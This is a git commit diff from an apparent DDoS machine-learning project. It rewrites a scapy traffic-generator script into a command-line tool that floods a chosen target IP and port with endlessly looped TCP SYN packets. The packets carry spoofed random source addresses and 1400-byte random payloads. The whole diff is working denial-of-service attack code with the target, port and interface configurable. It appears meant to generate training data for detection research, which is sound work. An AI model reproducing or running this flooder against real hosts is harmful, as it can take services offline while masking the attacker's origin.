4433fa68b8b61d144ac3f581b3848c4804e9adba
sehbeygi79 <sehbeygi79@gmail.com>
2022-08-01 00:46:35 +0430

    cleanings

--- ddos_ml/traffic_generator.py
+++ ddos_ml/traffic_generator.py
@@ -1,17 +1,19 @@
-# sudo apt install python3-scapy
+import argparse
 from scapy.all import *
 from scapy.layers.inet import *
 
-# pkts = sniff(offline="sample.pcap", count=2)
-# print(pkts)
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--target-ip', dest='target_ip', default='192.168.1.1')
+    parser.add_argument('--target-port', dest='target_port', default='80')
+    parser.add_argument('--sip-mask', dest='sip_mask', default='16')
+    parser.add_argument('--interface', '-if', dest='interface', default='lo')
+    parser.add_argument('--verbose', '-v', dest='verbose',
+                        action='store_true', default=False)
+    args = parser.parse_args()
 
+    ip = IP(src=RandIP(f"192.168.1.1/{int(args.sip_mask)}"), dst=args.target_ip)
+    tcp = TCP(sport=RandShort(), dport=int(args.target_port), flags="S")
 
-target_ip = "192.168.1.1"
-target_port = 80
-ip = IP(src=RandIP("192.168.1.1/16"), dst=target_ip)
-tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
-
-p = Ether() / ip / tcp / Raw(RandString(size=1400))
-
-sendp(p, iface='lo', loop=1, verbose=0)
-# sendpfast(p, iface='lo', pps=100000, loop=100000)
+    p = Ether() / ip / tcp / Raw(RandString(size=1400))
+    sendp(p, iface=args.interface, loop=1, verbose=args.verbose)
